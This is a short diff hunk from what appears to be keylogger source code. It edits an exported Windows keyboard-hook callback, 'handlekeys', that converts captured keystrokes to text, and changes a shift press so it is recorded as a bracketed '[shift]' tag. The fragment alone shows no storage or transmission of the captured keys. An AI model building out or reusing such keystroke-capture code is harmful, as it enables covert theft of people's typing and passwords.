@@ -45,7 +45,7 @@ __declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp
                 str = "";
                 capslock = !capslock;
             } else if (str == "shift") {
-                str = "";
+                str = "[" + str + "]";
                 shift = true;
             } else if (str == "enter") {
                 str = "\n";
